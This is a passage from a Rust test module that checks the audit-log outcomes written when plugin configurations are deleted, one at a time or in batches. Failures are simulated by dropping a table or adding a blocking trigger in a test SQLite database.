        assert_eq!(response.status(), StatusCode::NOT_FOUND);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Denied.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(
            details["reason_code"],
            serde_json::json!("plugin_config_not_found")
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn delete_plugin_config_load_db_failure_writes_failed_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        db.execute_unprepared("DROP TABLE plugin_configs")
            .await
            .expect("drop plugin_config table");

        let actor_user_id = uuid::Uuid::now_v7();
        let response = delete_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            Path(uuid::Uuid::now_v7()),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
        )
        .await;
        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Failed.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(
            details["reason_code"],
            serde_json::json!("plugin_config_load_failed")
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn delete_plugin_config_delete_db_failure_writes_failed_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let create_response = match create_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(CreatePluginConfigRequest {
                name: "Delete Failure Seed".to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("create handler returned ApiError unexpectedly"),
        };
        assert_eq!(create_response.status(), StatusCode::CREATED);

        let created = PluginConfig::find()
            .filter(plugin_config::Column::TenantId.eq(tenant_id))
            .filter(plugin_config::Column::Name.eq("Delete Failure Seed"))
            .filter(plugin_config::Column::DeactivatedAt.is_null())
            .order_by_desc(plugin_config::Column::CreatedAt)
            .one(&db)
            .await
            .expect("query created plugin config")
            .expect("created plugin config row");

        db.execute_unprepared(
            "CREATE TRIGGER plugin_config_block_soft_delete BEFORE UPDATE ON plugin_configs BEGIN SELECT RAISE(ABORT, 'blocked'); END;",
        )
        .await
        .expect("create blocking trigger");

        let delete_response = delete_plugin_config(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            Path(created.id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
        )
        .await;
        assert_eq!(delete_response.status(), StatusCode::INTERNAL_SERVER_ERROR);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Failed.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(
            details["reason_code"],
            serde_json::json!("plugin_config_delete_failed")
        );
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn batch_plugin_configs_unknown_action_writes_validation_failed_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let response = batch_plugin_configs(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(BatchActionRequest {
                action: "archive".to_string(),
                ids: vec![uuid::Uuid::now_v7()],
            }),
        )
        .await;

        assert_eq!(response.status(), StatusCode::BAD_REQUEST);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::ValidationFailed.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["reason_code"], serde_json::json!("unknown_action"));
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn batch_plugin_configs_delete_backend_failure_writes_failed_audit_event() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        db.execute_unprepared("DROP TABLE plugin_configs")
            .await
            .expect("drop plugin_config table");

        let actor_user_id = uuid::Uuid::now_v7();
        let response = batch_plugin_configs(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(BatchActionRequest {
                action: "delete".to_string(),
                ids: vec![uuid::Uuid::now_v7()],
            }),
        )
        .await;

        assert_eq!(response.status(), StatusCode::INTERNAL_SERVER_ERROR);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Failed.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(
            details["reason_code"],
            serde_json::json!("batch_delete_failed")
        );
    }

    #[cfg(feature = "db-sqlite")]
    async fn create_seed_plugin_config(
        state: Arc<AppState>,
        db: sea_orm::DatabaseConnection,
        tenant_id: uuid::Uuid,
        name: &str,
    ) -> uuid::Uuid {
        let actor_user_id = uuid::Uuid::now_v7();
        let create_response = match create_plugin_config(
            State(state),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(CreatePluginConfigRequest {
                name: name.to_string(),
                plugin_type: PluginTypeId::from_static("generic_shell"),
                config: serde_json::json!({ "version_command": "echo v1.0.0" }),
                enabled: true,
            }),
        )
        .await
        {
            Ok(response) => response.into_response(),
            Err(_) => panic!("create handler returned ApiError unexpectedly"),
        };
        assert_eq!(create_response.status(), StatusCode::CREATED);

        PluginConfig::find()
            .filter(plugin_config::Column::TenantId.eq(tenant_id))
            .filter(plugin_config::Column::Name.eq(name))
            .filter(plugin_config::Column::DeactivatedAt.is_null())
            .order_by_desc(plugin_config::Column::CreatedAt)
            .one(&db)
            .await
            .expect("query created plugin config")
            .expect("created plugin config row")
            .id
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn batch_plugin_configs_delete_summary_success_writes_success_outcome() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let first_id = create_seed_plugin_config(
            Arc::clone(&state),
            db.clone(),
            tenant_id,
            "Batch Success Seed 1",
        )
        .await;
        let second_id = create_seed_plugin_config(
            Arc::clone(&state),
            db.clone(),
            tenant_id,
            "Batch Success Seed 2",
        )
        .await;

        let actor_user_id = uuid::Uuid::now_v7();
        let response = batch_plugin_configs(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(BatchActionRequest {
                action: "delete".to_string(),
                ids: vec![first_id, second_id],
            }),
        )
        .await;
        assert_eq!(response.status(), StatusCode::OK);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Success.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["requested_count"], serde_json::json!(2));
        assert_eq!(details["deleted_count"], serde_json::json!(2));
        assert_eq!(details["failed_count"], serde_json::json!(0));
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn batch_plugin_configs_delete_summary_partial_writes_partial_outcome() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let existing_id = create_seed_plugin_config(
            Arc::clone(&state),
            db.clone(),
            tenant_id,
            "Batch Partial Seed",
        )
        .await;
        let missing_id = uuid::Uuid::now_v7();

        let actor_user_id = uuid::Uuid::now_v7();
        let response = batch_plugin_configs(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(BatchActionRequest {
                action: "delete".to_string(),
                ids: vec![existing_id, missing_id],
            }),
        )
        .await;
        assert_eq!(response.status(), StatusCode::OK);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Partial.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["requested_count"], serde_json::json!(2));
        assert_eq!(details["deleted_count"], serde_json::json!(1));
        assert_eq!(details["failed_count"], serde_json::json!(1));
    }

    #[cfg(feature = "db-sqlite")]
    #[tokio::test]
    async fn batch_plugin_configs_delete_summary_denied_writes_denied_outcome() {
        let db = crate::test_harness::setup_migrated_db().await;
        let tenant_id = crate::test_harness::insert_default_tenant(&db).await;
        let (state, _jwt) = crate::test_harness::build_test_state(db.clone(), tenant_id).await;

        let actor_user_id = uuid::Uuid::now_v7();
        let response = batch_plugin_configs(
            State(Arc::clone(&state)),
            TenantDb::new_for_test(db.clone(), tenant_id),
            CanManageCommands::new(AuthenticatedUser {
                user_id: actor_user_id,
                auth_method: AuthMethod::ApiToken,
                permissions: vec![Permission::ManageCommands],
            }),
            None,
            Validated(BatchActionRequest {
                action: "delete".to_string(),
                ids: vec![uuid::Uuid::now_v7()],
            }),
        )
        .await;
        assert_eq!(response.status(), StatusCode::OK);

        let row = latest_tenant_audit_row(
            &db,
            uptrakit_audit_log::AuditActionType::PLUGIN_CONFIG_DELETE,
        )
        .await;
        assert_eq!(
            row.outcome,
            uptrakit_audit_log::AuditOutcome::Denied.as_str()
        );
        let details = audit_details(&row);
        assert_eq!(details["requested_count"], serde_json::json!(1));
        assert_eq!(details["deleted_count"], serde_json::json!(0));
        assert_eq!(details["failed_count"], serde_json::json!(1));
    }
}
